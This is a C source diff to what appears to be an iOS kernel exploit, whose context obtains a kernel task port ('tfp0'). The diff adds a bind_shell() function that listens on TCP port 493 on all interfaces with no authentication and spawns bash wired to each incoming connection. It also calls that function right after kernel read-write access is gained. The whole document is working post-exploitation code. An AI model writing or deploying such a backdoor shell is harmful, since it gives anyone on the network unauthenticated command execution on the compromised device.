@@ -4,6 +4,8 @@
 #include <unistd.h>
 
 #include <mach/mach.h>
+#include <netinet/in.h>
+#include <spawn.h>
 
 #include <pthread.h>
 
@@ -688,11 +690,66 @@ mach_port_t get_kernel_memory_rw() {
   return safer_tfp0;
 }
 
+void bind_shell() {
+    
+    char* env = "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec";
+    char* bundle_root = bundle_path();
+    
+    char* shell_path = NULL;
+    asprintf(&shell_path, "%s/iosbinpack64/bin/bash", bundle_root);
+    
+    char* argv[] = {shell_path, NULL};
+    char* envp[] = {env, NULL};
+    
+    struct sockaddr_in sa;
+    sa.sin_len = 0;
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(493);
+    sa.sin_addr.s_addr = INADDR_ANY;
+    
+    int sock = socket(PF_INET, SOCK_STREAM, 0);
+    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
+    listen(sock, 1);
+    
+    printf("shell listening on port %d\n", 493);
+    
+    for(;;) {
+        int conn = accept(sock, 0, 0);
+        
+        posix_spawn_file_actions_t actions;
+        
+        posix_spawn_file_actions_init(&actions);
+        posix_spawn_file_actions_adddup2(&actions, conn, 0);
+        posix_spawn_file_actions_adddup2(&actions, conn, 1);
+        posix_spawn_file_actions_adddup2(&actions, conn, 2);
+        
+        
+        pid_t spawned_pid = 0;
+        int spawn_err = posix_spawn(&spawned_pid, shell_path, &actions, NULL, argv, envp);
+        
+        if (spawn_err != 0){
+            perror("shell spawn error");
+        } else {
+            printf("shell posix_spawn success!\n");
+        }
+        
+        posix_spawn_file_actions_destroy(&actions);
+        
+        printf("our pid: %d\n", getpid());
+        printf("spawned_pid: %d\n", spawned_pid);
+        
+        int wl = 0;
+        while (waitpid(spawned_pid, &wl, 0) == -1 && errno == EINTR);
+    }
+    
+    free(shell_path);
+}
+
 
 void go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
   printf("tfp0: %x\n", tfp0);
-  
+    bind_shell();
   if (probably_have_correct_symbols()) {
     printf("have symbols for this device, testing the kernel debugger...\n");
     test_kdbg();
